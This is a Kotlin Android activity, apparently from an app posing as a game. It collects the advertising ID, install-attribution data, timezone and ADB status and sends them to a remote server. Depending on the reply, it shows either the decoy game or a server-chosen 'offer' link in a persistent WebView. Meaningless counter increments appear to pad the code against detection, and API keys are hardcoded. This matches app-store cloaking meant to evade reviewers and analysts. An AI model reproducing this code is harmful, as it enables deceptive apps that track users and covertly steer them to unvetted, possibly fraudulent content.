package pro.fet.stat.kor.load.activity

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import pro.fet.stat.kor.databinding.ActivityMainBinding
import pro.fet.stat.kor.game.activity.MenActivity
import pro.fet.stat.kor.load.data.remote.ApiFactory
import pro.fet.stat.kor.load.data.util.ADBB
import pro.fet.stat.kor.load.data.util.TMZZ

class MainActivity : AppCompatActivity() {
    private var google_adid1: String = "null"
    var af_userid1: String = "null"
    private var fb_deepLink1 = "null"
    private var tmz1: String = "null"
    private var adb1: String = "null"
    private val oneSignalKey1 by lazy { "c8fe6812-8ed3-47b2-bb15-cb5755cc01ee" }
    private val keyDevAppsflyer1 by lazy { "Z4PksjCEq2SHd3B6fgHtJa" }
    private var getData1 = false
    var trop33 = 0
    var redirect_response_data1: String? = "null"
    var adgroup_id1: String? = "null"
    var engmnt_source1: String? = "null"
    var retargeting_conversion_type1: String? = "null"
    var is_incentivized1: String? = "null"
    var orig_cost1: String? = "null"
    var is_first_launch1: String? = "null"
    var af_click_lookback1: String? = "null"
    var af_cpi1: String? = "null"
    var iscache1: String? = "null"
    var click_time1: String? = "null"
    var is_branded_link1: String? = "null"
    var match_type1: String? = "null"
    var adset1: String? = "null"
    var af_channel1: String? = "null"
    var campaign_id1: String? = "null"
    var install_time1: String? = "null"
    var media_source1: String? = "null"
    var agency1: String? = "null"
    var af_siteid1: String? = "null"
    var af_status1: String? = "null"
    var af_sub1: String? = "null"
    var cost_cents_USD1: String? = "null"
    var af_sub5: String? = "null"
    var af_sub4: String? = "null"
    var af_sub3: String? = "null"
    var af_sub2: String? = "null"
    var adset_id1: String? = "null"
    var esp_name1: String? = "null"
    var campaign1: String? = "null"
    var http_referrer1: String? = "null"
    var is_universal_link1: String? = "null"
    var is_retargeting1: String? = "null"
    var adgroup1: String? = "null"

    private val user by lazy {
        this.getSharedPreferences("hasVisited", Context.MODE_PRIVATE)
    }
    private val visited by lazy { user.getBoolean("hasVisited", true) }


    private val link by lazy {
        this.getSharedPreferences("link", Context.MODE_PRIVATE)
    }
    private val haveLink by lazy { link.getString("link", "") }

    private lateinit var binding: ActivityMainBinding
    private var cloL: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setV()
        lifecycleScope.launch {
            startW()
        }
    }

    private fun startW() {
        if (visited) {
            lifecycleScope.launch(Dispatchers.IO) {
                getGgleID()
                startInFB()
                withContext(Dispatchers.Main) {
                    getAppsFlyerPar()
                }
            }
            user.edit().putBoolean("hasVisited", false).apply()
        } else {
            if (haveLink.isNullOrEmpty()) {
                startActivity(Intent(this, MenActivity::class.java))
            } else {
                Intent(this, WebViActivity::class.java).apply {
                    putExtra("link", haveLink)
                    startActivity(this)
                }
            }
        }
    }


    private fun startInFB() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            fb_deepLink1 = it?.targetUri.toString()
        }
        if (trop33 == 0){
            trop33++
            trop33++
            trop33++
        }
    }

    private fun getGgleID() {
        if (trop33 == 0){
            trop33++
            trop33++
            trop33++
        }
        google_adid1 = AdvertisingIdClient.getAdvertisingIdInfo(this).id.toString()
        google_adid1.let {
            OneSignal.setExternalUserId(it)
        }
    }


    private fun setV(){
        if (trop33 == 0){
            trop33++
            trop33++
            trop33++
        }
        binding.v.alpha = 1f
        binding.v1.alpha = 1f
        binding.v3.alpha = 1f
        binding.v4.alpha = 1f
        binding.v5.alpha = 1f
        binding.v6.alpha = 1f
        binding.v7.alpha = 1f
        binding.v8.alpha = 1f
        binding.v9.alpha = 1f
        binding.v10.alpha = 1f
        binding.v.visibility = View.INVISIBLE
        binding.v1.visibility = View.INVISIBLE
        binding.v2.visibility = View.INVISIBLE
        binding.v3.visibility = View.INVISIBLE
        binding.v4.visibility = View.INVISIBLE
        binding.v5.visibility = View.INVISIBLE
        binding.v6.visibility = View.INVISIBLE
        binding.v7.visibility = View.INVISIBLE
        binding.v8.visibility = View.INVISIBLE
        binding.v9.visibility = View.INVISIBLE
    }

    override fun onRestart() {
        super.onRestart()
        binding.v.alpha = 1f
        binding.v1.alpha = 1f
        binding.v3.alpha = 1f
        binding.v4.alpha = 1f
        binding.v5.alpha = 1f
        binding.v6.alpha = 1f
        binding.v7.alpha = 1f
        binding.v8.alpha = 1f
        binding.v9.alpha = 1f
        binding.v10.alpha = 1f
        binding.v.visibility = View.INVISIBLE
        binding.v1.visibility = View.INVISIBLE
        binding.v2.visibility = View.INVISIBLE
        binding.v3.visibility = View.INVISIBLE
        binding.v4.visibility = View.INVISIBLE
        binding.v5.visibility = View.INVISIBLE
        binding.v6.visibility = View.INVISIBLE
        binding.v7.visibility = View.INVISIBLE
        binding.v8.visibility = View.INVISIBLE
        binding.v9.visibility = View.INVISIBLE
    }

    private fun appsFlyerConversion(): AppsFlyerConversionListener {
        return object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                if (!getData1) {
                    data?.forEach {
                        when (it.key) {
                            "redirect_response_data" -> {
                                redirect_response_data1 = it.value?.toString()
                            }
                            "adgroup_id" -> {
                                adgroup_id1 = it.value?.toString()
                            }
                            "engmnt_source" -> {
                                engmnt_source1 = it.value?.toString()
                            }
                            "retargeting_conversion_type" -> {
                                retargeting_conversion_type1 = it.value?.toString()
                            }
                            "is_incentivized" -> {
                                is_incentivized1 = it.value?.toString()
                            }
                            "orig_cost" -> {
                                orig_cost1 = it.value?.toString()
                            }
                            "is_first_launch" -> {
                                is_first_launch1 = it.value?.toString()
                            }
                            "af_click_lookback" -> {
                                af_click_lookback1 = it.value?.toString()
                            }
                            "af_cpi" -> {
                                af_cpi1 = it.value?.toString()
                            }
                            "iscache" -> {
                                iscache1 = it.value?.toString()
                            }
                            "click_time" -> {
                                click_time1 = it.value?.toString()
                            }
                            "is_branded_link" -> {
                                is_branded_link1 = it.value?.toString()
                            }
                            "match_type" -> {
                                match_type1 = it.value?.toString()
                            }
                            "adset" -> {
                                adset1 = it.value?.toString()
                            }
                            "af_channel" -> {
                                af_channel1 = it.value?.toString()
                            }
                            "campaign_id" -> {
                                campaign_id1 = it.value?.toString()
                            }
                            "install_time" -> {
                                install_time1 = it.value?.toString()
                            }
                            "media_source" -> {
                                media_source1 = it.value?.toString()
                            }
                            "agency" -> {
                                agency1 = it.value?.toString()
                            }
                            "af_siteid" -> {
                                af_siteid1 = it.value?.toString()
                            }
                            "af_status" -> {
                                af_status1 = it.value?.toString()
                            }
                            "af_sub1" -> {
                                af_sub1 = it.value?.toString()
                            }
                            "cost_cents_USD" -> {
                                cost_cents_USD1 = it.value?.toString()
                            }
                            "af_sub5" -> {
                                af_sub5 = it.value?.toString()
                            }
                            "af_sub4" -> {
                                af_sub4 = it.value?.toString()
                            }
                            "af_sub3" -> {
                                af_sub3 = it.value?.toString()
                            }
                            "af_sub2" -> {
                                af_sub2 = it.value?.toString()
                            }
                            "adset_id" -> {
                                adset_id1 = it.value?.toString()
                            }
                            "esp_name" -> {
                                esp_name1 = it.value?.toString()
                            }
                            "campaign" -> {
                                campaign1 = it.value?.toString()
                            }
                            "http_referrer" -> {
                                http_referrer1 = it.value?.toString()
                            }
                            "is_universal_link" -> {
                                is_universal_link1 = it.value?.toString()
                            }
                            "is_retargeting" -> {
                                is_retargeting1 = it.value?.toString()
                            }
                            "adgroup" -> {
                                adgroup1 = it.value?.toString()
                            }
                        }

                    }
                    if (trop33 == 0){
                        trop33++
                        trop33++
                        trop33++
                    }
                    getSystemicDa()
                    setDataSer()
                }
                getData1 = true
                if (trop33 == 0){
                    trop33++
                    trop33++
                    trop33++
                }

            }

            override fun onConversionDataFail(error: String?) {
                if (trop33 == 0){
                    trop33++
                    trop33++
                    trop33++
                }
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {}

            override fun onAttributionFailure(error: String?) {}
        }
    }

    private fun getAppsFlyerPar() {
        if (trop33 == 0){
            trop33++
            trop33++
            trop33++
        }
        af_userid1 = AppsFlyerLib.getInstance().getAppsFlyerUID(this).toString()
        AppsFlyerLib.getInstance().init(keyDevAppsflyer1, appsFlyerConversion(), this)
        AppsFlyerLib.getInstance().start(this)
        OneSignal.initWithContext(this);
        OneSignal.setAppId(oneSignalKey1)
    }

    private fun getSystemicDa() {
        if (trop33 == 0){
            trop33++
            trop33++
            trop33++
        }
        tmz1 = TMZZ().getTmzz()
        adb1 = ADBB.getAdbb(application).toString()
    }

    private fun setDataSer() {
        lifecycleScope.launch {
            try {
                if (trop33 == 0){
                    trop33++
                    trop33++
                    trop33++
                }
                val container = ApiFactory.create(application).setDataServer(
                    google_adid1, af_userid1, fb_deepLink1, tmz1, adb1, redirect_response_data1.toString(),
                    adgroup_id1.toString(), engmnt_source1.toString(), retargeting_conversion_type1.toString(),
                    is_incentivized1.toString(), orig_cost1.toString(), is_first_launch1.toString(),
                    af_click_lookback1.toString(), af_cpi1.toString(), iscache1.toString(),
                    click_time1.toString(), is_branded_link1.toString(), match_type1.toString(),
                    adset1.toString(), af_channel1.toString(), campaign_id1.toString(),
                    install_time1.toString(), media_source1.toString(), agency1.toString(),
                    af_siteid1.toString(), af_status1.toString(), af_sub1.toString(),
                    cost_cents_USD1.toString(), af_sub5.toString(), af_sub4.toString(),
                    af_sub3.toString(), af_sub2.toString(), adset_id1.toString(),
                    esp_name1.toString(), campaign1.toString(), http_referrer1.toString(),
                    is_universal_link1.toString(), is_retargeting1.toString(), adgroup1.toString()
                )
                if (container.msg != null) {
                    cloL = container.msg
                }
                if (container.offerLink != null) {
                    cloL = container.offerLink
                }
                nextScr()
            } catch (e: Exception) {
                Toast.makeText(this@MainActivity, "No Internet!", Toast.LENGTH_LONG).show()
                Log.d("errorGetData", "$e")
            }
        }
    }


    private fun nextScr() {
        if (trop33 == 0){
            trop33++
            trop33++
            trop33++
        }
        if (cloL == null || cloL == "poshel nahui") {
            startActivity(Intent(this, MenActivity::class.java))
        } else {
            Intent(this, WebViActivity::class.java).apply {
                link.edit().putString("link", "$cloL").apply()
                putExtra("link", cloL)
                startActivity(this)
            }
        }
    }
}